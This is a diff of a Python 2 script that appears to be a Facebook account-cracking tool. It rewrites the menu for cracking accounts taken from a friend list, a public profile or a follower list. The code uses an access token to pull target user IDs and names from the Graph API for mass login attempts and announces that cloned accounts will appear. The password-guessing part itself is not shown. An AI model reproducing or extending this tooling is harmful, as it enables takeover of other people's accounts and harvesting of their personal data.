@@ -378,71 +378,178 @@ def menu():
         menu()
 
     os.system("clear")
-	print logo
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
-	pilih_super()
 
-def pilih_super():
-	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
-	if peak =="":
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-		pilih_super()
-	elif peak =="1":
-		os.system('clear')
+    print logo
+
+    print("")
+
+    print("\t\033[1;92mHello : " +nm)
+
+    print("")
+
+    print("\033[1;97m[1]\033[1;91m > \033[1;97mCrack From Friendlist")
+
+    print("")
+
+    print("\033[1;97m[2]\033[1;91m > \033[1;97mCrack From Public id")
+
+    print("")
+
+    print("\033[1;97m[3]\033[1;91m > \033[1;97mCrack From Followers id")
+
+    print("")
+
+    print("\033[1;97m[0]\033[1;91m > \033[1;97mlogout")
+
+    print("")
+
+    menu_select()
+
+def menu_select():
+
+	select = raw_input("\033[1;93mOption : ")
+
+	id=[]
+
+	oks=[]
+
+	cps=[]
+
+	if select=="1":
+
+		os.system("clear")
+
 		print logo
-		print 42*"\033[1;96m="
-		jalan('\033[1;96m[👾] \033[1;93mGetting ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+
+		print("")
+
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
+
 		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif peak =="2":
-		os.system('clear')
+
+		for s in z["data"]:
+
+			uid=s['id']
+
+			na=s['name']
+
+			nm=na.rsplit(" ")[0]
+
+			id.append(uid+'|'+nm)
+
+	if select =="2":
+
+		os.system("clear")
+
+		print(logo)
+
+		print("")
+
+		idt = raw_input("\033[1;97m[!] Put ID/Username :\033[1;96m ")
+
+		os.system("clear")
+
 		print logo
-		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
+
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
-			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-			super()
-		jalan('\033[1;96m[👾] \033[1;93mGetting IDs \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+
+			q = json.loads(r.text)
+
+			print("[!] Target from : "+q["name"])
+
+		except (KeyError , IOError):
+
+		    print("")
+
+		    print("\033[1;91your login account has checkpoint").center(50)
+
+		    print("")
+
+		    menu()
+
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+
 		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif peak =="3":
-		os.system('clear')
+
+		for i in z["data"]:
+
+			uid=i['id']
+
+			na=i['name']
+
+			nm=na.rsplit(" ")[0]
+
+			id.append(uid+'|'+nm)
+
+	elif select =="3":
+
+		os.system("clear")
+
 		print logo
-		print 42*"\033[1;96m="
+
+		print("")
+
+		idt = raw_input("\033[1;97m[!] Put ID/Username :\033[1;96m ")
+
+		os.system("clear")
+
+		print logo
+
 		try:
-			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
-			for line in open(idlist,'r').readlines():
-				id.append(line.strip())
-		except IOError:
-			print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
-			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
-			super()
-	elif peak =="0":
-		menu()
+
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+
+			q = json.loads(r.text)
+
+			print(" Target from  : "+q["name"])
+
+		except (KeyError , IOError):
+
+		    print("")
+
+		    print("\033[1;91m login id has checkpoint").center(50)
+
+		    print("")
+
+		    time.sleep(3)
+
+		    menu()
+
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
+
+		z = json.loads(r.text)
+
+		for i in z["data"]:
+
+			uid=i['id']
+
+			na=i['name']
+
+			nm=na.rsplit(" ")[0]
+
+			id.append(uid+'|'+nm)
+
+	elif select =="0":
+
+	    os.system("exit")
+
 	else:
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-		pilih_super()
-	
-	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m[👾] \033[1;93mStarting \033[1;97m...')
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print
-	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
+
+	    print("")
+
+	    print("Please Select A Valid Option").center(50)
+
+	    time.sleep(2)
+
+	    menu_select()
+
+	print("[!] Total IDs : "+str(len(id)))
+
+	time.sleep(0.5)
+
+	print("[!] Plz wait clone account will be appear here")
 	print 42*"\033[1;96m="
 	
 			
